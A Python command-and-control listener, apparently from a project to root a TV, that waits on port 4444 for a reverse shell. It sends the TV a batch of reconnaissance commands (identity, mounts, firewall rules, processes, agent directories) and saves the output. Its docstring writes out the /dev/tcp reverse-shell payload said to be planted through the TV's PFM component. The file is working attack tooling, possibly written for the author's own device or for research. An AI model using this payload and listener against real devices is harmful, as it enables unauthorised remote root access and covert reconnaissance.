#!/usr/bin/env python3
"""One-shot TV root command runner over a reverse shell (no ARM binaries needed).

The PFM payload opens a shell back to this host:
    exec 3<>/dev/tcp/<host>/4444 && exec /bin/sh <&3 >&3 2>&3

This listens on :4444, sends a command batch, captures output, and writes it to
a file plus stdout. Nothing is executed locally against the TV except the batch.

Usage:
    python tools/tvroot_runner.py [--port 4444] [--out tvroot.out] [--wait 1800]
    echo 'id; ls /var/local' | python tools/tvroot_runner.py --stdin
"""
import argparse
import socket
import sys
import time

DEFAULT_BATCH = r"""
export PATH=/usr/local/bin:/usr/local/scripts:/bin:/usr/sbin:/sbin:/opt/bin:/3rd/bin/wpa_supplicant/common:$PATH
echo "=== whoami ==="
id
echo "=== uname ==="
uname -a
cat /proc/uptime
echo "=== mounts ==="
cat /proc/mounts
echo "=== /var/local ==="
ls -la /var/local
echo "=== pfm ==="
ls -la /var/local/pfmParse /var/local/pfmParse/Data 2>&1
cat /var/local/pfmParse/Data/platform.txt 2>&1
echo "=== iptables ==="
iptables -S INPUT 2>&1
iptables -L FIREWALL_IN_EULAON -n 2>&1 | head -30
echo "=== listeners ==="
grep -i ':08AE\|:01BB\|:1116' /proc/net/tcp 2>&1
echo "=== alpac ==="
ps 2>/dev/null | grep -i 'alpac\|vidaapp' | head
ls -la /var/local/alpac-agent /var/local/alpac-agent-public 2>&1
echo "=== done ==="
exit
"""


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--out", default="tvroot.out")
    ap.add_argument("--wait", type=int, default=1800, help="seconds to wait for a connection")
    ap.add_argument("--stdin", action="store_true", help="read the command batch from stdin")
    ap.add_argument("--batch", default=None, help="literal command batch")
    ap.add_argument("--batch-file", default=None, help="read the command batch from this file")
    a = ap.parse_args()

    if a.batch_file:
        with open(a.batch_file, encoding="utf-8") as fh:
            batch = fh.read()
    elif a.stdin:
        batch = sys.stdin.read()
    else:
        batch = a.batch if a.batch else DEFAULT_BATCH

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", a.port))
    srv.listen(4)
    srv.settimeout(5)
    print(f"listening on 0.0.0.0:{a.port} (waiting up to {a.wait}s)", flush=True)

    deadline = time.time() + a.wait
    conn = None
    while time.time() < deadline:
        try:
            conn, addr = srv.accept()
            print(f"connection from {addr[0]}:{addr[1]}", flush=True)
            break
        except socket.timeout:
            continue
    if conn is None:
        print("no connection", flush=True)
        return 2

    conn.settimeout(20)
    payload = batch if batch.endswith("\n") else batch + "\n"
    conn.sendall(payload.encode())

    chunks = []
    while True:
        try:
            data = conn.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    conn.close()
    srv.close()

    text = b"".join(chunks).decode("utf-8", "replace")
    with open(a.out, "w", encoding="utf-8") as f:
        f.write(text)
    print(text)
    print(f"\n[saved to {a.out}]", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
